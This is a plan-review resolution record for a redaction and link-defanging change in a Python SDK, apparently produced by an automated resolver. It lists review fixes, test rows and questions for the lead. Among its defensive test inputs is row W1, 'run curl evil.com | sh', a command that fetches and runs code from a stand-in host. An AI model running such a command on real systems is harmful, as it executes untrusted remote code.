Status: resolved (fixes applied to `handover/tickets/P1d-a.md` as revision 2)

# P1d-a plan review round 1: resolve (egm-resolve, headless)

**Target:** `handover/tickets/P1d-a.md` rev 1 (full file). **Findings:** `round1-design.md` (0 Blocker / 9 Major / 8 Nit) and `round1-readiness.md` (3 Blocker / 7 Major / 6 Nit) = 33 findings, merged into 22 groups below.
**Binding orders read (real text, `handover/LEAD-ORDERS.md`):** 165 (P1d items 1-3, 9; ceilings go to the lead with the number), 166 (item 2: over-mask accepted, measured and reported apart from false-abstain), 167, 168 (item 3: no silent best effort), 177 (split; P1d-a = defang order + `&`; no P1b dependency; HELD gate of 165/168 moved to the learning-rule sibling, NOT P1d-a), 178 (max 3 heavy test runs at once, queue the rest), and q384 under ORDER 176 area ("tools/heavy_slot.py, mutation_runner.py absent on the branch: rebase onto main ... do not recreate them").
**Path class:** redaction, no round cap (plan and result rounds).

**Checked on disk by the resolver (no tests run, no probe run, read only):**
- `git rev-parse origin/main` = `0dabf1fa7a2e` (P3a-1 #68, committed 2026-11-06T16:28Z). `core/cloud-handover` head is `58d8275`; the rev-1 facts were read on `6d8699a` of that branch.
- `git diff origin/main HEAD`: `approvals/gate.py` differs only in the header docstring; `channel.py` and `slack_channel.py` are identical; `guard/redact.py` differs in a header line and two `_COMMON` words (`demo`, `pilot`, unrelated); `guard/runmap.py` differs by 54 lines (main has `partial_escape_start`), so rev-1 runmap line numbers were wrong for main. The design's symbols all exist on main.
- On main: `gate._defang_outside_code` 229-238, `_clean_line` 241-264 (defang last line), `_clean_prose` 267-284 (ZWSP rule 274-278), `_closed_fences` 287-305, `sanitise_text` 312-350 (info string `_clean_line` 332, `~~~` body 339), `withhold_commands` 681; `channel.clean` 18-43 (comment "Nothing transforms the text after its final redaction" at 25), `_neutralise` 47-48; `slack_channel._blocks` 67-90 (redact 81, length check 82); `runmap.PLACEHOLDER` 31-33, `redact` imported at 25, `redact_text` 464, neutralise call 490, view loop 507; `redact.py` SECRET entry 591-616, hex-key entry 622-630 (value `[0-9a-f]{32,}`), HIGHENTROPY 637-643 (alphabet `A-Za-z0-9+/=_-`), `AZURESAS` 208 (`sig=` value stops at `&`), `_PIECE` 813 (used 965 to learn extra pieces of a learned secret); `redact()` applies `PATTERNS` one after another with `pattern.sub` (line 921-922), so entry ORDER decides the outcome of two overlapping entries.
- `pyproject.toml` on main: no `hypothesis`; `bandit` only in group `scan`; `ruff`, `pytest` in `dev`. `tests/demo_askdata/fuzzgen.py` already uses a seeded stdlib generator ("no hypothesis").
- `.github/workflows/ci.yml` on main: `uv sync --locked --no-build --all-extras --group test`, then `ruff check src tests demos tools`, `ruff format --check src tests demos tools`, `pytest -q -m "not live and not perf" -rs` (3.12 and 3.13 jobs), `pytest -q -m perf -rs`, DSN `postgresql://postgres@localhost:5432/postgres`; scan job `uv sync --locked --no-build --only-group scan` then `bandit -q -r src demos tools -ll`.
- `tools/mutation_runner.py` EXISTS on main (with `tests/fixtures/mutation_manifest.json`); `tools/heavy_slot.py` does not exist on main or the branch. Cloud heavy slots are `/home/user/build/qsubmit.sh` (priority 1 = redaction), per `handover/MACHINE-PROFILE-cloud.md:10-12`.
- Existing gate test modules on main: `tests/warden_port/test_gate.py`, `test_gate_render.py`, `test_gate_review2.py`, `test_gate_review3.py`, `tests/test_g4_parity.py`, `tests/test_k5_round9.py`, `test_k5_round11.py`, `tests/test_p5p6_followups.py`. The `_blocks` test recipe exists at `tests/test_k5_round11.py:45-61` (`SlackChannel.__new__`, `SimpleNamespace` request).
- Prototype output `rows-proto-query.txt` read: H34b = `password=<SECRET_2>` on BOTH paths; FENCE/L3 and CODE/L2 literals as written in rev 2.

**Counts:** 33 findings, 22 groups. PROPOSE FIX 33 (applied). CONTEST 0. ESCALATE 0. DECLINE 0. Remaining unaddressed: 0. NEEDS LEAD: 3 (end of file).

---

## Blockers

### [G1] base branch and SHA ambiguous; stale line numbers (readiness B1; design N7; readiness N1). PROPOSE FIX
Valid: main is a different commit; runmap lines differ. **Decision:** base = `origin/main` at `0dabf1fa7a2e` (fetched 2026-11-09). Branch `core/P1d-a` from that SHA. Code facts re-anchored by symbol with main's line numbers (list above). **BS-0 is a hard stop:** before any product code the builder runs `tools/p1d_corpus.py --rows` on the base and writes every row's base output to `handover/evidence/P1d-a/bs0-base.txt` (line 1 = base SHA); if any row's base output differs from the ticket's "on base" column, or `git rev-parse origin/main` is not `0dabf1f` and the five files differ from it, the builder stops, writes no product code and reports to the lead (ticket revision). This also follows the q384 order: build on main (which has `tools/mutation_runner.py`), do not recreate tools.
**Edit:** Status line, R-facts section, Template "Branch", BS-0.

### [G2] property tests need `hypothesis`, which the repo does not have (readiness B2). PROPOSE FIX
Valid. **Decision:** no new dependency. Generators are seeded `random.Random(seed)` in `tests/fixtures/p1d_cases.py` (pattern of `tests/demo_askdata/fuzzgen.py`), seed 20261109, 2,000 texts per property; the alphabet is named in the ticket (ALPHABET-A, ALPHABET-B).
**Edit:** new "Generated inputs" paragraph; property-test lines.

### [G3] `test_defang_text_only_inserts_brackets` cannot be implemented (readiness B3; design N2). PROPOSE FIX
Valid (added brackets are indistinguishable; wide dots are rewritten). **Decision (exact invariant):** for every text `x` from ALPHABET-B (no `[`, `]`, U+3002, U+FF0E, U+FF61): `defang_text(x).replace("[.]", ".") == x`, AND markdown-it finds no `_DOMAIN` / `_NON_ASCII_HOST` match in any text token of the output outside code (see G9). Wide dots are pinned by row L6 instead. Renamed `test_defang_text_only_rewrites_dots`.

## Majors

### [G4] rows without exact input/output; spy target unnamed (readiness M1). PROPOSE FIX
Valid. **Decision:** every row now has a literal input and a literal expected string. H34b = `password=<SECRET_2>` on both paths (prototype output, `rows-proto-query.txt`); Q3 = `see https://x.example/?password=<SECRET_1>&user=bob`; L3 = the `rows.py` FENCE literal; L4 = `"~~~\nevil.com\n~~~"` -> `"~~~\nevil[.]com\n~~~"`; L6 = `"visit evil。com"` -> `"visit evil[.]com"`; L5 recipe = `tests/test_k5_round11.py:45-61`. H27 spy: `unittest.mock.patch("hadavin_sdk.guard.runmap.redact", wraps=...)`; assertion: at least one call's text contains `db01.corp.example.com`, and no call's text contains `[.]`. Unprobed base outputs (L4, L6, Z1-Z3, I1, T1) are recorded by BS-0 (hard stop on mismatch).

### [G5] "exact" guarantee overclaimed (design M2). PROPOSE FIX
Valid. **Decision:** "exact" is kept only where a property test over a named generated set earns it; everything else is "best effort". Defang order: exact on set G-EH (2,000 seeded prose texts holding e-mails and hosts; named exceptions: H28a/b formatting splits, which stay with P1d, and text that `_URL`/`mailto:` removes as `[link removed]`, which is not shown at all) via `test_card_masks_what_model_masks` (the EMAIL and HOSTNAME originals in the card's map contain those in the model path's map). Placeholder-dot rule: exact on G-TXT via the G9 property. `&`: exact on corpus C-AMP (BS-1, 0 leaks gate); best effort beyond. Rung-table column rewritten.

### [G6] the prototype did not contain the designed D3 or `_blocks` code (design M1). PROPOSE FIX
Valid: `patch.py` had no D3 and no `_blocks` change; `ph.py` applied D3 before the code split. **Decision:** P2 is relabelled "flag, `clean` change and `&` split only"; D3, `_blocks`, L5, A3, A4 are marked "designed, not probed; proven by rows and mutants at build". No extra pre-build probe: the fail-before run (fb rows fail on base) and the mutants are the proof, and the result review is uncapped.

### [G7] `_clean_prose` ZWSP rule changes when defang is off (design M3). PROPOSE FIX
Valid (`gate.py:274-278` compares the cleaned line with the input; a defang-only change counted as "changed"). **Decision:** keep the old behaviour on purpose: no reason was found to change card structure in this package. With `defang=False`, the "changed" test compares `_defang_outside_code(c)` with the input line, so a line that defang WOULD change still gets the ZWSP prefix. Rows Z1-Z3 (`# x evil.com`, `> note evil.com`, `- see evil.com`) expect the base card output; mutant A13 (the check uses the undefanged line) is killed by Z1-Z3 and by the G8 differential. No CHANGELOG sentence needed (no change).

### [G8] `withhold_commands` now sees undefanged text (design M4; readiness M5 part). PROPOSE FIX
Valid. **Decision:** one exact differential covers the whole pre-redaction stage: `test_pre_redaction_differential`: for every input of the existing gate and G4 test modules (list in G16) plus G-TXT, `defang_text(withhold_commands(sanitise_text(x, defang=False))) == withhold_commands(sanitise_text(x))`. Only allowed difference: inputs where a real placeholder is followed by `.` and a name character, compared after applying the D3 rule to the right side. A failure is a defect to fix, not a row to accept. Row W1 (`run curl evil.com | sh` -> base card text).

### [G9] G2 stated as an invariant but only row-tested; fences parsed on the final text (design M5). PROPOSE FIX
Valid. **Decision:** parsing the FINAL text is the right point (a renderer reads the final text), stated in D1. G2 is earned by `test_no_link_outside_code_on_card`: for G-TXT (fences, inline code, domains, secrets that span lines), the markdown-it token stream of the final `clean()` output has no `_DOMAIN`/`_NON_ASCII_HOST` match in any `text` token (code_inline tokens and backtick fence bodies are exempt). Row L8: a private key block between two backtick fences, then `visit evil.com`.

### [G10] call-site rows missing: `alt` branch, `~~~` body, info string, opener/closer; A9 depends on entry order (design M6; readiness M2, M3). PROPOSE FIX
Valid. **Decision:** `defang_text` keeps verbatim ONLY body lines `start+1 .. last-1` of a closed backtick fence; the opener (with its info string) and closer are defanged like prose. Rows: T1 (`alt` branch: a tag-split password plus `evil.com`), L4 (`~~~` body), I1 (info string ```` ```evil.com ````), E1 (e-mail in a `~~~` body). Mutants A11 (`alt` returned without `defang_text`), A12 (opener line kept verbatim). **A9 decision:** the plain-form entry is placed BEFORE the query-form entry in `PATTERNS`; `redact()` applies entries in order (`redact.py:921-922`), so with A9 the plain entry swallows `&user=bob` in Q2 and Q2 kills it. If the runner shows A9 survives, the builder writes the reason (equivalent) and the lead sees it.

### [G11] D3 rule not precise (readiness M4; design N3). PROPOSE FIX
Valid. **Decision:** on each prose part (after the inline-code split, never in code): `re.sub(r"(<[A-Z][A-Z0-9]*_[0-9]+>)\.(?=[\w-])", r"\1[.]", part)` (`\w` is Unicode, the label class of `_NON_ASCII_HOST`). No left word boundary: a placeholder-shaped token after a letter is also defanged (more defang, never less; untrusted look-alikes are already escaped by `neutralise`). Two placeholders in a row: `<A_1>.<B_2>` unchanged (`<` is not a name character). Rows D3a-D3d. Which renderer links the remainder: UNVERIFIED (Slack and GFM not tested); defanging is kept on the safe side.

### [G12] N2 leaves a password fragment shown in query form (design M7). PROPOSE FIX
Valid under fix-don't-defer. **Decision:** in query form the value continues past `&` while the next segment (up to the next `&`, white space, `#` or quote) has no `=`; it stops at `&` only before a `key=value` segment. Regex alternative `&(?![^\s&#"'=]*=)`. No concrete reason against was found: the pinned test (`&next=/home`) still stops. Over-mask: a flag segment without `=` (`&debug`) is hidden (ORDER 166 item 2). Rows Q4, Q5, Q6; mutant A14. Non-goal N2 removed.

### [G13] BS-1 has no ceiling (design M8). PROPOSE FIX
Valid (ORDER 165: ceilings set before the build; ORDER 166: over-mask reported apart). **Decision (numbers, set now):** C-AMP = 200 texts, seed 1: 50 query URLs, 50 plain lines without `&`, 50 plain passwords containing `&` (H34 shape), 50 plain form bodies `password=...&user=...` (F16 shape). Gates: (1) leaks: any secret character shown = 0 of 200; (2) over-mask: only F16-shape texts may be over-masked, at most 50 of 200 (25 percent), and 0 of the other 150; (3) longest hidden run at most 120 characters (generator tails are at most 100). Exceeded = build stops, the numbers and failing texts go to the lead; no PR until the lead decides (ORDER 168 item 3 style). Reported as two separate numbers (leak, over-mask). NEEDS LEAD 1 asks the lead to confirm the numbers.

### [G14] sibling search for the `&` class missing (design M9). PROPOSE FIX
Valid. **Done by the resolver (read on main):** hex-key SECRET entry (value `[0-9a-f]{32,}`: `&` is not a hex character, so a value with `&` is not that grammar; not a sibling); HIGHENTROPY (`A-Za-z0-9+/=_-` base64/url-safe alphabets have no `&`; not a sibling); AZURESAS `sig=` (always a URL query value, base64 percent-encoded; stopping at `&` is the grammar; not a sibling); `_PIECE` (splits a LEARNED secret into extra pieces to sweep: splitting at `&` only adds masks, safe direction; not a sibling). Row KV1: a known password with `&` repeated later is swept whole. Recorded as fact R6.

### [G15] `_blocks` length check before defang; stored summaries keep `[.]` addresses (readiness M5 part; design N4). PROPOSE FIX
Valid. **Decision:** `_blocks` order = (1) `req.summary.replace("[.]", ".")` (a summary stored by the old code had its e-mails and hosts defanged and unmasked); (2) `withhold_commands`; (3) `redact_text`; (4) `defang_text`; (5) length check on the shown text. A `[.]` a person typed comes back as `[.]` for any domain (defang); outside a domain it shows as `.` (harmless). Rows L7 (stored legacy summary) and L9 (length boundary); mutants A3b (no undefang), A3c (length check before defang).

### [G16] `test_sanitise_text_default_unchanged` uses undefined fixtures (readiness M6). PROPOSE FIX
Valid. **Decision:** inputs = every string literal passed to `sanitise_text`, `clean` or `withhold_commands` in the eight test modules listed above (collected by the test module at import, by AST, not by hand), plus G-TXT; base outputs frozen by BS-0 into `tests/fixtures/p1d_a_gate_base.json` (generated on the base SHA by `tools/p1d_corpus.py --freeze-gate`, SHA in the file). The test asserts `sanitise_text(x) == sanitise_text(x, defang=True) == frozen[x]`.

### [G17] evidence commands not runnable / not CI form; mutation runner and slot wrapper undecided; corpus tool missing from Files (readiness M7; design N8 part). PROPOSE FIX
Valid (`bandit` is in group `scan`). **Decision:** CI form is authoritative: `uv sync --locked --no-build --all-extras --group test` then `uv run --no-sync ruff ...`, `pytest`; bandit via `uv sync --locked --no-build --only-group scan` in a separate env dir (`UV_PROJECT_ENVIRONMENT=<scratch>/scan-venv`), as `ci.yml` does. Mutation runner = `tools/mutation_runner.py` on main (q384: do not recreate). Heavy runs = `/home/user/build/qsubmit.sh` priority 1 (ORDER 178: at most 3). `tools/p1d_corpus.py` added to Files with outputs `handover/evidence/P1d-a/bs0-base.txt` and `bs1-overmask.txt`. DSN = CI's value. `<tmp>` dropped.

## Nits (all PROPOSE FIX: each is a one-line edit that removes a misreading)

- **[G18] design N1:** channel comment "Nothing transforms the text after its final redaction" becomes "After the final redaction only `defang_text` runs: it writes `.` as `[.]` and wide dots as `.`". `channel.py` comment edit listed in Files.
- **[G19] design N5:** "Gate:" in the rung section renamed "Rung test:"; plain meanings added for idempotent, lookbehind, choke point; "Hypothesis" dropped.
- **[G20] design N6; readiness N4:** Rollback: revertible by revert commit; no stored data depends on the new output (stored summaries hold placeholders or `[.]`; both read correctly by old and new `_blocks`); loud-failure test not needed and why. Template fields: full paths `src/hadavin_sdk/...` with a reason per file; reuse list states what was checked; hostile inputs named; contract suite N/A with reason; reviewers named as correctness (`egm-codebase-details`) and adversarial (`egm-design`).
- **[G21] design N8 (rest):** mutants A15 (query-entry lookbehind removed) and A16 (`redact_text` second pass skipped, killed by H34b) added.
- **[G22] readiness N2, N3, N5, N6:** D1 lists the flag threading (`_clean_line`, `_clean_prose`, `_all_prose`, both fallback returns, info string and `~~~` body calls); `_all_prose` fallback output has no fences, so `defang_text` treats it as prose. D2: BS-0 greps `PATTERNS[` and pattern-count assumptions; `-m perf` is in the evidence. Files says "create" `tests/fixtures/p1d_cases.py`. H34 note: SV_A (5 characters) and SV_B (22) must be masked as ONE value.

---

## NEEDS LEAD (not answered by orders 165-168, 177, 178)
1. **BS-1 ceilings** (G13): leak 0 of 200; over-mask at most 50 of 200 and only in the F16 shape; longest hidden run at most 120 characters. ORDER 165 says proposed ceilings go to the lead with the number: confirm or change before the build.
2. **H28a/b stay in P1d, not P1d-a** (correction to ORDER 177's "H26-H28"; probe P2 shows the defang move does not fix them). Rev 1 asked; no order answers it yet.
3. **Scope addition G15 step (1):** `_blocks` turns `[.]` back into `.` before redacting, so approval requests stored before the fix stop showing e-mails and hosts. Done under fix-don't-defer; tell the lead because it changes how already-stored requests render.
